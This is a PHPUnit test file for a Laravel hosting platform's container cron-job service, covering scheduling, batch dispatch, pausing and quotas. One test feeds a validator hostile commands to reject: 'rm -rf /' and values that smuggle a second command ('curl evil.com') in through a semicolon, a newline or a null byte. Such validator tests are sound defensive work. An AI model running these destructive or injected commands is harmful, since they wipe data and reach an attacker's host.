<?php

namespace Tests\Unit\Services\Provisioning;

use App\Enums\ServiceStatus;
use App\Jobs\RunContainerCronJob;
use App\Models\ContainerCronJob;
use App\Models\ContainerDeployment;
use App\Models\Node;
use App\Models\Product;
use App\Models\Service;
use App\Models\Setting;
use App\Models\User;
use App\Services\Provisioning\ContainerCronService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Bus;
use Tests\TestCase;

class ContainerCronServiceTest extends TestCase
{
    use RefreshDatabase;

    private ContainerCronService $service;

    protected function setUp(): void
    {
        parent::setUp();
        $this->service = app(ContainerCronService::class);
    }

    public function test_creates_cron_job_with_next_run(): void
    {
        $user = User::factory()->create();
        $product = Product::factory()->containerHosting()->create();
        $service = Service::factory()->create([
            'user_id' => $user->id,
            'product_id' => $product->id,
            'provisioning_driver_key' => 'container',
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $job = $this->service->create($service, [
            'name' => 'Laravel scheduler',
            'schedule' => '*/5 * * * *',
            'command' => 'php artisan schedule:run',
        ]);

        $this->assertSame($service->id, $job->service_id);
        $this->assertTrue($job->enabled);
        $this->assertNotNull($job->next_run_at);
    }

    public function test_rejects_unsafe_command(): void
    {
        $this->assertFalse($this->service->isAllowedCommand('rm -rf /'));
        $this->assertFalse($this->service->isAllowedCommand('php artisan schedule:run; curl evil.com'));
        $this->assertFalse($this->service->isAllowedCommand("php artisan schedule:run\ncurl evil.com"));
        $this->assertFalse($this->service->isAllowedCommand("php artisan schedule:run\0ignored"));
        $this->assertTrue($this->service->isAllowedCommand('php artisan schedule:run'));
    }

    public function test_rejects_invalid_schedule(): void
    {
        $this->assertFalse($this->service->isValidSchedule('not-a-cron'));
        $this->assertTrue($this->service->isValidSchedule('0 * * * *'));
    }

    public function test_deleting_job_removes_record(): void
    {
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $job = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Test',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
        ]);

        $this->service->delete($job);

        $this->assertDatabaseMissing('container_cron_jobs', ['id' => $job->id]);
    }

    public function test_claim_due_job_advances_next_run_once(): void
    {
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $job = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Claim test',
            'schedule' => '*/5 * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subMinute(),
        ]);

        $this->assertTrue($this->service->claimDueJob($job));
        $firstNext = $job->fresh()->next_run_at;
        $this->assertNotNull($firstNext);
        $this->assertTrue($firstNext->gt(now()));

        $this->assertFalse($this->service->claimDueJob($job->fresh()));
        $this->assertTrue($job->fresh()->next_run_at->equalTo($firstNext));
    }

    public function test_run_due_jobs_defers_when_batch_budget_exhausted(): void
    {
        $node = Node::factory()->containerHost()->create();
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
            'status' => ServiceStatus::Active,
            'node_id' => $node->id,
        ]);
        ContainerDeployment::factory()->create([
            'service_id' => $service->id,
            'node_id' => $node->id,
            'status' => 'running',
        ]);

        ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Deferred',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subMinute(),
        ]);

        $summary = $this->service->runDueJobs(limit: 5, maxBatchSeconds: 0);

        $this->assertSame(0, $summary['processed']);
        $this->assertSame(1, $summary['deferred']);
        $this->assertTrue(
            ContainerCronJob::where('service_id', $service->id)->first()->next_run_at->lte(now())
        );
    }

    public function test_inactive_service_jobs_do_not_consume_global_batch_slots(): void
    {
        $node = Node::factory()->containerHost()->create();
        $product = Product::factory()->containerHosting()->create();

        $inactive = Service::factory()->create([
            'product_id' => $product->id,
            'status' => ServiceStatus::Suspended,
            'node_id' => $node->id,
        ]);
        ContainerDeployment::factory()->create([
            'service_id' => $inactive->id,
            'node_id' => $node->id,
            'status' => 'stopped',
        ]);
        ContainerCronJob::create([
            'service_id' => $inactive->id,
            'name' => 'Inactive',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subDay(),
        ]);

        $active = Service::factory()->create([
            'product_id' => $product->id,
            'status' => ServiceStatus::Active,
            'node_id' => $node->id,
        ]);
        ContainerDeployment::factory()->create([
            'service_id' => $active->id,
            'node_id' => $node->id,
            'status' => 'running',
        ]);
        ContainerCronJob::create([
            'service_id' => $active->id,
            'name' => 'Active',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subMinute(),
        ]);

        $summary = $this->service->runDueJobs(limit: 1, maxBatchSeconds: 0);

        $this->assertSame(1, $summary['deferred']);
    }

    public function test_due_jobs_are_claimed_and_dispatched_without_running_ssh_in_scheduler(): void
    {
        Bus::fake();
        $node = Node::factory()->containerHost()->create();
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
            'status' => ServiceStatus::Active,
            'node_id' => $node->id,
        ]);
        ContainerDeployment::factory()->create([
            'service_id' => $service->id,
            'node_id' => $node->id,
            'status' => 'running',
        ]);
        $job = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Due',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subMinute(),
        ]);

        $summary = $this->service->runDueJobs(limit: 1, maxBatchSeconds: 30);
        $run = $job->runs()->sole();

        $this->assertSame(1, $summary['dispatched']);
        $this->assertSame('queued', $run->status);
        $this->assertTrue($job->fresh()->next_run_at->isFuture());
        Bus::assertDispatched(
            RunContainerCronJob::class,
            fn (RunContainerCronJob $queued) => $queued->cronJobId === $job->id
                && $queued->runId === $run->id
                && $queued->queue === 'container-cron'
        );
    }

    public function test_pause_and_resume_only_reenable_jobs_paused_by_platform(): void
    {
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
            'status' => ServiceStatus::Active,
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $enabled = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Enabled',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->addMinute(),
        ]);
        $disabled = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Disabled',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => false,
        ]);

        $this->assertSame(1, $this->service->pauseForService($service));
        $this->assertFalse($enabled->fresh()->enabled);
        $this->assertTrue($enabled->fresh()->paused_by_system);
        $this->assertFalse($disabled->fresh()->paused_by_system);

        $this->assertSame(1, $this->service->resumeForService($service));
        $this->assertTrue($enabled->fresh()->enabled);
        $this->assertFalse($enabled->fresh()->paused_by_system);
        $this->assertFalse($disabled->fresh()->enabled);
    }

    public function test_system_jobs_do_not_consume_customer_quota(): void
    {
        config()->set('containers.cron.max_jobs_per_service', 1);
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
            'status' => ServiceStatus::Active,
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $system = $this->service->createSystem($service, [
            'name' => 'System',
            'schedule' => '*/5 * * * *',
            'command' => 'php /var/www/html/wp-cron.php',
        ]);
        $customer = $this->service->create($service, [
            'name' => 'Customer',
            'schedule' => '*/5 * * * *',
            'command' => 'php artisan schedule:run',
        ]);

        $this->assertTrue($system->is_system);
        $this->assertFalse($customer->is_system);

        $this->expectException(\InvalidArgumentException::class);
        $this->service->create($service, [
            'name' => 'Over quota',
            'schedule' => '*/5 * * * *',
            'command' => 'php artisan inspire',
        ]);
    }

    public function test_customer_next_run_uses_configured_cron_timezone(): void
    {
        Setting::setValue('cron_timezone', 'Africa/Nairobi');

        $next = $this->service->calculateNextRun(
            '0 2 * * *',
            Carbon::parse('2026-01-01 00:00:00', 'UTC')
        );

        $this->assertSame('Africa/Nairobi', $next->timezoneName);
        $this->assertSame('2026-01-02 02:00:00', $next->format('Y-m-d H:i:s'));
    }
}
